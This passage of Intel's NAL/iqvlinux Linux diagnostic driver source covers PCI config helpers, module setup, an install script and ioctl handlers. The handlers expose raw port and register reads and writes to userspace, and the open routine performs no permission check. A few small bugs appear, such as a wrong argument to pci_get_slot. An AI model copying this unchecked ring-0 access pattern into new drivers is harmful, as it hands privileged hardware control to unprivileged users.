#endif

NAL_PHYSICAL_ADDRESS Global_SpiBaseRegPhysicalAddress = 0;

/* For SPI:
*/

BOOLEAN _NalIsBytMfgModeDoneSet()
{
    struct pci_dev*         LinuxPciDevice = NULL;
    struct pci_bus*         LinuxPciBus    = NULL;
    unsigned int            DeviceFunction = 0;
    int                     Result         = 0;
    unsigned int value = 0;
    BOOLEAN status = FALSE;

    /* Use segments for creating a Linux PCi Device, for segemented architecture */
    LinuxPciBus = pci_find_bus(0, HECI_PCI_BUSNUMBER);

    if(LinuxPciBus != NULL)
    {
        /* Set up the DeviceFunction variable */
        DeviceFunction = PCI_DEVFN(HECI_PCI_DEVICEID, HECI_PCI_FUNCTION);

        /* Get the pci device from the bus/dev/function */
        LinuxPciDevice = pci_get_slot(LinuxPciBus, HECI_PCI_FUNCTION);

        /* Read the DWORD */
        if(LinuxPciDevice != NULL)
        {
            Result = pci_read_config_dword(LinuxPciDevice, ME_PCI_FWSTATUS_REG , &value);

            if(Result == 0)
            {
                status = (value & ME_PCI_FWSTATUS_MFG_DONE) ? true:false;
            }
        }
        pci_dev_put(LinuxPciDevice);
    }
    return status;
}

BOOLEAN _NalIsBytPciDevices(IN NAL_PHYSICAL_ADDRESS PhysicalAddress)
{
    struct pci_dev*         LinuxPciDevice = NULL;
    struct pci_bus*         LinuxPciBus    = NULL;
    unsigned int            DeviceFunction = 0;
    int                     Result         = 0;
    unsigned int value = 0;
    BOOLEAN status = FALSE;

    /* Use segments for creating a Linux PCi Device, for segemented architecture */
    LinuxPciBus = pci_find_bus(0, LPC_PCI_BUSNUMBER);

    if(LinuxPciBus != NULL)
    {
        /* Set up the DeviceFunction variable */
        DeviceFunction = PCI_DEVFN(LPC_PCI_DEVICEID, LPC_PCI_FUNCTION);

        /* Get the pci device from the bus/dev/function */
        LinuxPciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);

        /* Read the DWORD */
        if(LinuxPciDevice != NULL)
        {
            Result = pci_read_config_dword(LinuxPciDevice, LPC_SBASE_REG_OFFSET, &value);
            if(Result == 0)
            {
                Global_SpiBaseRegPhysicalAddress = value;
                status = ((PhysicalAddress & 0xFFFFF000) == (value & 0xFFFFF000))  ? TRUE:FALSE;

            }
            if(status == FALSE)
            {
                value = 0;
                Result = pci_read_config_dword(LinuxPciDevice, LPC_PBASE_REG_OFFSET, &value);
                if(Result == 0)
                {
                    status = ((PhysicalAddress & 0xFFFFF000) == (value & 0xFFFFF000))  ? TRUE:FALSE;
                }
            }
        }
        pci_dev_put(LinuxPciDevice);
    }
    return status;
}

UINT16
_NalReadPciDeviceCount(
    VOID
    )
{

    return 0;
}

NAL_STATUS
_NalReadPciDevice(
    OUT NAL_DEVICE_LOCATION* PciLocations,
    IN UINT16* Count
    )
{

    return NAL_NOT_IMPLEMENTED;
}

NAL_STATUS
_NalFillPciConfigSpec(
    IN NAL_DEVICE_LOCATION PciLocation,
    OUT PCI_DEVICE* Device,
    IN UINT32 DwordCount
    )
{

    return NAL_NOT_IMPLEMENTED;
}

NAL_STATUS
_NalOSReadPciConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    OUT UINT32* Value
    )
{
    struct pci_dev* LinuxPciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    NAL_STATUS NalStatus = NAL_INVALID_PCI_SLOT_ID;
    unsigned int DeviceFunction = 0;
    int Result = 0;

    LinuxPciBus = pci_find_bus(PciLocation.Pci.Segment, PciLocation.Pci.Bus);

    if(LinuxPciBus != NULL)
    {

        DeviceFunction = PCI_DEVFN(PciLocation.Pci.Device, PciLocation.Pci.Function);

        LinuxPciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);

        if(LinuxPciDevice != NULL)
        {
            Result = pci_read_config_dword(LinuxPciDevice, DwordNumber*4, (u32*)Value);

            if(Result == 0)
            {

                NalStatus = NAL_SUCCESS;
            }
            else
            {
                NalStatus = NAL_PCI_CAPABILITY_NOT_FOUND;
                *Value = 0;
            }
        }
        pci_dev_put(LinuxPciDevice);
    }
    return NalStatus;
}

NAL_STATUS
_NalOSWritePciConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT32 Data
    )
{
    struct pci_dev* LinuxPciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    NAL_STATUS NalStatus = NAL_INVALID_PCI_SLOT_ID;
    unsigned int DeviceFunction = 0;
    int Result = 0;

    DeviceFunction = PCI_DEVFN(PciLocation.Pci.Device, PciLocation.Pci.Function);

    LinuxPciBus = pci_find_bus(PciLocation.Pci.Segment, PciLocation.Pci.Bus);

    if(LinuxPciBus != NULL)
    {

        LinuxPciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);

        if(LinuxPciDevice != NULL)
        {
            Result = pci_write_config_dword(LinuxPciDevice, DwordNumber*4, Data);
            if(Result == 0)
            {
                NalStatus = NAL_SUCCESS;
            }
            else
            {
                NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
            }
        }
        pci_dev_put(LinuxPciDevice);
    }
    return NalStatus;
}

NAL_STATUS
_NalOSWritePciConfigVariable(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT8 ByteMask,
    IN UINT32 Data
    )
{
    struct pci_dev* LinuxPciDevice = NULL;
    struct pci_bus* LinuxPcibus = NULL;
    NAL_STATUS NalStatus = NAL_INVALID_PCI_SLOT_ID;
    unsigned int DeviceFunction = 0;
    int Result = 0;
    UINT16 Data16 = 0;
    UINT8 Data8 = 0;

    DeviceFunction = PCI_DEVFN(PciLocation.Pci.Device, PciLocation.Pci.Function);

    do
    {

        LinuxPcibus = pci_find_bus(PciLocation.Pci.Segment, PciLocation.Pci.Bus);
        if(LinuxPcibus == NULL)
        {
            break;
        }

        LinuxPciDevice = pci_get_slot(LinuxPcibus, DeviceFunction);

        if(LinuxPciDevice == NULL)
        {
            break;
        }

        if(ByteMask == PCI_CONFIG_BM_ENTIRE_DWORD)
        {
            Result = pci_write_config_dword(LinuxPciDevice, DwordNumber*4, Data);
            break;
        }

        if(ByteMask == PCI_CONFIG_BM_LOWORD)
        {
            Data16 = LOWORD(Data);
            Result = pci_write_config_word(LinuxPciDevice, DwordNumber*4, Data);
            break;
        }

        if(ByteMask == PCI_CONFIG_BM_HIWORD)
        {
            Data16 = HIWORD(Data);
            Result = pci_write_config_word(LinuxPciDevice, (DwordNumber*4 + 2), Data);
            break;
        }

        if(ByteMask & PCI_CONFIG_BM_BYTE1)
        {
            Data8 = (UINT8)Data;
            Result = pci_write_config_byte(LinuxPciDevice, (DwordNumber*4), Data8);
        }

        if(ByteMask & PCI_CONFIG_BM_BYTE2)
        {
            Data8 = (UINT8)(Data >> 8);
            Result = pci_write_config_byte(LinuxPciDevice, (DwordNumber*4 + 1), Data8);
        }

        if(ByteMask & PCI_CONFIG_BM_BYTE3)
        {
            Data8 = (UINT8)(Data >> 16);
            Result = pci_write_config_byte(LinuxPciDevice, (DwordNumber*4 + 2), Data8);
       }

        if(ByteMask & PCI_CONFIG_BM_BYTE4)
        {
            Data8 = (UINT8)(Data >> 24);
            Result = pci_write_config_byte(LinuxPciDevice, (DwordNumber*4 + 3), Data8);
        }
    }
    while(FALSE);
    if(Result == 0)
    {
        NalStatus = NAL_SUCCESS;
    }
    else
    {
        NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
    }
    return NalStatus;
}

NAL_STATUS
_NalEnablePciDevice(
    IN NAL_DEVICE_LOCATION DeviceLocation
    )
{
    struct pci_dev* LinuxPciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    unsigned int DeviceFunction = 0;
    int Result = -1;
    NAL_STATUS Status = NAL_SUCCESS;

    DeviceFunction = PCI_DEVFN(DeviceLocation.Pci.Device, DeviceLocation.Pci.Function);

    LinuxPciBus = pci_find_bus(DeviceLocation.Pci.Segment, DeviceLocation.Pci.Bus);

    if(LinuxPciBus != NULL)
    {

        LinuxPciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);

	if (LinuxPciDevice)
		Result = pci_enable_device(LinuxPciDevice);

        if(Result != 0)
        {
            Status = NAL_PCICONFIG_NOT_AVAILABLE;
        }
    }
    return Status;
}

NAL_STATUS
_NalOSWritePciExConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT32 Data
    )
{
    return _NalOSWritePciConfig32(PciLocation, DwordNumber, Data);
}

NAL_STATUS
_NalOSReadPciExConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT32* Value
    )
{
   return _NalOSReadPciConfig32(PciLocation, DwordNumber, Value);
}

NAL_STATUS
_NalOsReadPciExByte(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN UINT32 ByteIndex,
    OUT UINT8* Value
    )
{
    struct pci_dev* LinuxPciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    NAL_STATUS Status = NAL_INVALID_PCI_SLOT_ID;
    unsigned int DeviceFunction = 0;

    printk(KERN_DEBUG "in the driver Pci Ex config function byte index %d\n", ByteIndex);

    LinuxPciBus = pci_find_bus(DeviceLocation.Pci.Segment, DeviceLocation.Pci.Bus);

    if((LinuxPciBus != NULL) && (ByteIndex < 4096))
    {

        DeviceFunction = PCI_DEVFN(DeviceLocation.Pci.Device, DeviceLocation.Pci.Function);

        LinuxPciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);

        if(LinuxPciDevice != NULL)
        {
            pci_read_config_byte(LinuxPciDevice, ByteIndex, Value);
            Status = NAL_SUCCESS;
        }
    }

    return Status;
}

NAL_STATUS
_NalOsWritePciExByte(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN UINT32 ByteOffset,
    IN UINT8 Data
    )
{
    struct pci_dev* LinuxPciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    NAL_STATUS Status = NAL_INVALID_PCI_SLOT_ID;
    unsigned int DeviceFunction = 0;

    LinuxPciBus = pci_find_bus(DeviceLocation.Pci.Segment, DeviceLocation.Pci.Bus);

    if((LinuxPciBus != NULL) && (ByteOffset < 4096))
    {

        DeviceFunction = PCI_DEVFN(DeviceLocation.Pci.Device, DeviceLocation.Pci.Function);

        LinuxPciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);

        if(LinuxPciDevice != NULL)
        {
            pci_write_config_byte(LinuxPciDevice, ByteOffset, Data);
            Status = NAL_SUCCESS;
        }
    }

    return Status;
}

```

`source/IntelNal/src/linuxnaldriver.c`:

```c
/*
 * Intel QV Linux kernel driver for Android SPI device
 * Copyright (c) 1999 - 2013, Intel Corporation.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
 *
 */

/*
 *
 * Module Name:
 *   linuxnaldriver.c
 *
 * Abstract:
 *   This contains the functions necessary for the Linux Driver
 *   component of NAL to function as a driver. This includes the
 *   driver entry point and all Linux specific ring 0 functions.
 *
 *
 */


#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/pci_ids.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/version.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <asm/uaccess.h>
#include "naltypes.h"
#include "nalioctl.h"
#include "linuxnaldriver.h"

int
init_module(void);
void
cleanup_module(void);

extern spinlock_t Global_AtomicTestSetSpinLock;
static char Global_NalDeviceName[] = NAL_LINUX_DRIVER_NAME;
static int Global_NalMajor = 0;
static struct class *nal_class = NULL;
static struct device *nal_device = NULL;
static dev_t nal_dev;
static struct cdev nal_cdev;

NAL_ADAPTER_IN_USE_TABLE Global_AdapterInUse[NAL_DRIVER_MAX_ADAPTERS];
UINT32 Global_DriverReferenceCount = 0;

char NalLinuxDriverVersion[] = LINUX_DRIVER_VERSION;

static struct file_operations Global_NalFops =
{
    owner: THIS_MODULE,

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,36)
    ioctl: NalDeviceControl,
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,10)

    unlocked_ioctl: NalDeviceControlUnlockedIoctl,
#endif
    open: NalOpen,
    release: NalRelease
};

MODULE_AUTHOR(DRIVER_COMPANYNAME);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);
MODULE_LICENSE("GPL");
MODULE_VERSION(LINUX_DRIVER_VERSION);

int
init_module(void)
{
#ifdef NAL_LINUX_ANDROID
    int Result = 0;
    UINT32 i = 0;

    printk(KERN_DEBUG "Intel Memmap SPI Device Driver loading (v. %s)\n", LINUX_DRIVER_VERSION);

    /* Get a range of minor numbers (starting with 0) to work with */
    Result = alloc_chrdev_region(&nal_dev, 0, 1, Global_NalDeviceName);
    if (Result < 0) {
	printk(KERN_WARNING "[target] alloc_chrdev_region() failed\n");
	return Result;
    }
    Global_NalMajor = MAJOR(nal_dev);

    nal_class = class_create(THIS_MODULE, Global_NalDeviceName);
    if (nal_class == NULL) {
        printk(KERN_DEBUG "Intel Memmap SPI Device Driver cannot create class\n");
        return -ENODEV;
    }

    cdev_init(&nal_cdev, &Global_NalFops);
    nal_cdev.owner = THIS_MODULE;
    nal_cdev.ops = &Global_NalFops;
    Result = cdev_add (&nal_cdev, MKDEV(Global_NalMajor, 0), 1);
    /* Fail gracefully if need be */
    if (Result)
        printk(KERN_NOTICE "Error %d adding scull%d", Result, 0);

    nal_device = device_create(nal_class, NULL, nal_dev, NULL, Global_NalDeviceName);
    printk(KERN_DEBUG "Intel Memmap SPI Device Driver device major: %d\n", Global_NalMajor);

    if (nal_device == NULL) {
        printk(KERN_DEBUG "Intel Memmap SPI Device Driver cannot create device\n");
        return -ENODEV;
    }

    for(i=0; i<NAL_DRIVER_MAX_ADAPTERS; i++)
    {
        memset(&Global_AdapterInUse[i], 0, sizeof(NAL_ADAPTER_IN_USE_TABLE));
    }

    spin_lock_init(&Global_AtomicTestSetSpinLock);

    return Result;
#else
    int Result = 0;
    UINT32 i = 0;
    static struct class *nal_class = NULL;
    static struct device *nal_device = NULL;

    printk(KERN_DEBUG "Intel Pro Diagnostic Driver loading (v. %s)\n", LINUX_DRIVER_VERSION);
    Result = register_chrdev(0, Global_NalDeviceName, &Global_NalFops);
    if(Result < 0)
    {
        Result = -ENODEV;
    }
    else
    {
        Global_NalMajor = Result;
        Result = 0;
    }

    nal_class = class_create(THIS_MODULE, Global_NalDeviceName);
    if (nal_class == NULL) {
        printk(KERN_DEBUG "Intel Pro Diagnostic Driver cannot create class\n");
        return -ENODEV;
    }

    nal_device = device_create(nal_class, NULL, Global_NalMajor, NULL, Global_NalDeviceName);
    if (nal_device == NULL) {
        printk(KERN_DEBUG "Intel Pro Diagnostic Driver cannot create device\n");
        return -ENODEV;
    }

    for(i=0; i<NAL_DRIVER_MAX_ADAPTERS; i++)
    {
        memset(&Global_AdapterInUse[i], 0, sizeof(NAL_ADAPTER_IN_USE_TABLE));
    }

    spin_lock_init(&Global_AtomicTestSetSpinLock);

    return Result;
#endif
}

void
cleanup_module(void)
{
#ifdef NAL_LINUX_ANDROID
    printk(KERN_DEBUG "Intel Memmap SPI Device Driver exiting\n");

    cdev_del(&nal_cdev);

    if (nal_device)
        device_destroy(nal_class, MKDEV(Global_NalMajor, 0));

    if (nal_class)
        class_destroy(nal_class);

    unregister_chrdev_region(nal_dev, 1);
#else
    printk(KERN_DEBUG "Intel Pro Diagnostic Driver exiting\n");

    if (nal_device)
        device_destroy(nal_class, MKDEV(Global_NalMajor, 0));

    if (nal_class)
        class_destroy(nal_class);

    unregister_chrdev(Global_NalMajor, Global_NalDeviceName);
#endif
}

long
NalDeviceControlUnlockedIoctl(
    struct file* File,
    unsigned int Cmd,
    unsigned long Arg
    )

{
    return NalDeviceControl(NULL, File, Cmd, Arg);
}

int
NalDeviceControl(
    struct inode* Inode,
    struct file* File,
    unsigned int Cmd,
    unsigned long Arg
    )
{
    NAL_IOCTL_INPUT_DATA InputData;
    NAL_IOCTL_INPUT_DATA* NalIoctlInputData = &InputData;
#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,0)
    mm_segment_t old_fs;
#endif
    NAL_STATUS Status = NAL_SUCCESS;
    UINT32 IoctlNumber = 0;
    int Result = 0;

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,0)

    old_fs = get_fs();
    set_fs(get_ds());
    Result = copy_from_user(&InputData, (void*)Arg, sizeof(NAL_IOCTL_INPUT_DATA));
    set_fs(old_fs);
#else
    Result = copy_from_user(&InputData, (void*)Arg, sizeof(NAL_IOCTL_INPUT_DATA));
#endif
    if(Result == 0)
    {

        IoctlNumber = Cmd;

        switch (IoctlNumber)
        {
        case IOCTL_NAL_OSI:
            Status = NalResolveOsiIoctl(NalIoctlInputData);
            break;

        case IOCTL_NAL_HW_BUS:
            Status = NalResolveHwBusIoctl(NalIoctlInputData);
            break;

        case IOCTL_NAL_NDI:
            Status = NalResolveNdiIoctl(NalIoctlInputData);
            break;

        case IOCTL_NAL_OS_SPECIFIC:
            Status = NalResolveOsSpecificIoctl(NalIoctlInputData);
            break;

        default:

            Status = NAL_INVALID_PARAMETER;
            Result = EINVAL;
            break;
        }
    }
    if(Result == 0)
    {

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,0)
        old_fs = get_fs();
        set_fs(get_ds());
        Result = copy_to_user((void*)Arg, NalIoctlInputData, sizeof(NAL_IOCTL_INPUT_DATA));
        set_fs(old_fs);
#else

        Result = copy_to_user((void*)Arg, NalIoctlInputData, sizeof(NAL_IOCTL_INPUT_DATA));
#endif
    }
    return Result;
}

int
NalOpen(
    struct inode* Inode,
    struct file* File
    )
{
    return 0;
}

int
NalRelease(
    struct inode* Inode,
    struct file* File
    )
{
    return 0;
}

BOOLEAN
_NalMarkAdapterInUse(
    IN NAL_DEVICE_LOCATION NalDevice,
    IN BOOLEAN Lock
    )
{
    UINTN i = 0;
    BOOLEAN CanBeUsed = FALSE;

    for(i=0; i<NAL_DRIVER_MAX_ADAPTERS; i++)
    {

        if(Global_AdapterInUse[i].DeviceLocation.Reserved == NalDevice.Reserved)
        {

            if(Global_AdapterInUse[i].InUse == TRUE)
            {

                if(Lock == FALSE)
                {
                    Global_AdapterInUse[i].InUse = FALSE;
                    Global_AdapterInUse[i].DeviceLocation.Reserved = 0;
                    CanBeUsed = TRUE;
                    break;
                }
                else
                {
                    CanBeUsed = FALSE;
                    break;
                }
            }

            else if(Lock == TRUE)
            {
                Global_AdapterInUse[i].InUse = TRUE;
                CanBeUsed = TRUE;
                break;
            }
        }
    }

    if(i == NAL_DRIVER_MAX_ADAPTERS && Lock == TRUE)
    {

        for(i=0; i<NAL_DRIVER_MAX_ADAPTERS; i++)
        {
            if(Global_AdapterInUse[i].DeviceLocation.Reserved == 0)
            {
                break;
            }
        }

        if(i<NAL_DRIVER_MAX_ADAPTERS)
        {
            Global_AdapterInUse[i].DeviceLocation.Reserved = NalDevice.Reserved;
            Global_AdapterInUse[i].InUse = Lock;
            CanBeUsed = TRUE;
        }
    }

    else if(i == NAL_DRIVER_MAX_ADAPTERS && Lock == FALSE)
    {
        CanBeUsed = TRUE;
    }

    return CanBeUsed;
}

BOOLEAN
_NalIsAdapterInUse(
    IN NAL_DEVICE_LOCATION NalDevice
    )
{
    UINTN i = 0;
    BOOLEAN IsInUse = FALSE;

    for(i=0; i<NAL_DRIVER_MAX_ADAPTERS; i++)
    {

        if(Global_AdapterInUse[i].DeviceLocation.Reserved == NalDevice.Reserved)
        {

            if(Global_AdapterInUse[i].InUse == TRUE)
            {
                IsInUse = TRUE;
                break;
            }
        }
    }

    return IsInUse;
}

UINT32
_NalDriverGetReferenceCount(
 VOID
 )
{
    return Global_DriverReferenceCount;
}

VOID
_NalDriverIncrementReferenceCount(
    VOID
    )
{

    spin_lock(&Global_AtomicTestSetSpinLock);
    Global_DriverReferenceCount++;
    spin_unlock(&Global_AtomicTestSetSpinLock);
}

VOID
_NalDriverDecrementReferenceCount(
    VOID
    )
{

    spin_lock(&Global_AtomicTestSetSpinLock);
    if(Global_DriverReferenceCount > 0)
    {
        Global_DriverReferenceCount--;
    }
    spin_unlock(&Global_AtomicTestSetSpinLock);
}

VOID
_NalDriverGetVersion(
 OUT CHAR* Version
 )
{
    strcpy(Version, NalLinuxDriverVersion);
}

```

`source/IntelNal/src/nalinstall`:

```
#!/bin/sh

#  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of version 2 of the GNU General Public License as
# published by the Free Software Foundation.
#
#  This program is distributed in the hope that it will be useful, but
#  WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
#  The full GNU General Public License is included in this distribution
#  in the file called LICENSE.GPL.
#
#  Contact Information:
#  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
#  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

if [ "$1" = "" ] 
then
    SOURCE_DIR=$PWD
else
    SOURCE_DIR=$1
fi

MachineType=$(uname -i)
KernelVersion=$(uname -r)

K_VERSION=`uname -r| cut -c1-3 | sed 's/2\.[56]/2\.6/'`

DriverName=iqvlinux
if [ "$K_VERSION" = "2.4" ]
then
    DriverFileName=$DriverName.o
else
    DriverFileName=$DriverName.ko
fi

rm -f /lib/modules/$KernelVersion/kernel/drivers/net/$DriverFileName
cp $SOURCE_DIR/$DriverFileName /lib/modules/$KernelVersion/kernel/drivers/net
# Install the node and driver
echo "Try and unload the old driver..."
rmmod -s $DriverName
echo "Installed!!"

```

`source/IntelNal/src/nalioctldrv.c`:

```c
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   nalioctldrv.c
 *
 * Abstract:
 *   This contains driver (ring 0) functions that are shared between
 *   protected mode operating systems.
 *
 */



#include <os_i.h>
#include <pci_i.h>
#include <nalioctl.h>

#if defined(NAL_WINNT_WDM) || defined(NAL_WINNT4)
#include <windriverdevice_i.h>
#endif

#if defined(NAL_LINUX)
#include <linuxnaldriver.h>
#endif

#if defined(NAL_SOLARIS)
#include <osdevice_i.h>
#include <solarisnaldriver.h>
#endif

NAL_STATUS
NalResolveNdiIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    )
{
    NAL_STATUS NalStatus = NAL_INVALID_PARAMETER;

    if(NalIoctl != NULL)
    {
        switch(NalIoctl->FunctionId)
        {
            case NAL_INITIALIZEINTERRUPTS_FUNCID:
                {
                    NAL_INTERRUPT_FUNCS* FunctionData =
                        (NAL_INTERRUPT_FUNCS*)(&(NalIoctl->InputBuffer));
                    if(FunctionData != NULL)
                    {
                        FunctionData->ReturnValue =
                            _NalInitializeInterrupts(FunctionData->NalOsDevice);
                    }
                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_UNINITIALIZEINTERRUPTS_FUNCID:
                {
                    NAL_INTERRUPT_FUNCS* FunctionData =
                        (NAL_INTERRUPT_FUNCS*)(&(NalIoctl->InputBuffer));
                    if(FunctionData != NULL)
                    {
                        FunctionData->ReturnValue =
                            _NalUninitializeInterrupts(FunctionData->NalOsDevice);
                    }
                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_HASINTERRUPTOCCURRED_FUNCID:
                {
                    NAL_INTERRUPT_FUNCS* FunctionData =
                        (NAL_INTERRUPT_FUNCS*)(&(NalIoctl->InputBuffer));
                    if(FunctionData != NULL)
                    {
                        FunctionData->Triggered =
                            _NalHasInterruptOccurred(FunctionData->NalOsDevice);
                    }
                    NalStatus = NAL_SUCCESS;
                }
                break;

           default:

                NalStatus = NAL_IOCTL_INVALID_FUNCTION_ID;
                break;
        }
    }
    return NalStatus;
}

NAL_STATUS
NalResolveOsiIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    )
{
    NAL_STATUS NalStatus = NAL_INVALID_PARAMETER;

    if(NalIoctl != NULL)
    {

        switch(NalIoctl->FunctionId)
        {
        case NAL_READPORT8_FUNCID:
            {
                NAL_READPORT_FUNCS* FunctionData =
                    (NAL_READPORT_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue.Uint8 =
                    NalReadPort8(FunctionData->Port);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_READPORT16_FUNCID:
            {
                NAL_READPORT_FUNCS* FunctionData =
                    (NAL_READPORT_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue.Uint16 =
                    NalReadPort16(FunctionData->Port);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_READPORT32_FUNCID:
            {
                NAL_READPORT_FUNCS* FunctionData =
                    (NAL_READPORT_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue.Uint32 =
                    NalReadPort32(FunctionData->Port);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_WRITEPORT8_FUNCID:
            {
                NAL_WRITEPORT_FUNCS* FunctionData =
                    (NAL_WRITEPORT_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalWritePort8(FunctionData->Port,
                                  FunctionData->Value.Uint8);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_WRITEPORT16_FUNCID:
            {
                NAL_WRITEPORT_FUNCS* FunctionData =
                    (NAL_WRITEPORT_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalWritePort16(FunctionData->Port,
                                   FunctionData->Value.Uint16);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_WRITEPORT32_FUNCID:
            {
                NAL_WRITEPORT_FUNCS* FunctionData =
                    (NAL_WRITEPORT_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalWritePort32(FunctionData->Port,
                                   FunctionData->Value.Uint32);

                NalStatus = NAL_SUCCESS;
            }
            break;

       case NAL_READREGISTER8_FUNCID:
            {
                NAL_READREGISTER_FUNCS* FunctionData =
                    (NAL_READREGISTER_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue.Uint8 =
                    NalReadRegister8(FunctionData->Address);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_READREGISTER16_FUNCID:
            {
                NAL_READREGISTER_FUNCS* FunctionData =
                    (NAL_READREGISTER_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue.Uint16 =
                    NalReadRegister16(FunctionData->Address);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_READREGISTER32_FUNCID:
            {
                NAL_READREGISTER_FUNCS* FunctionData =
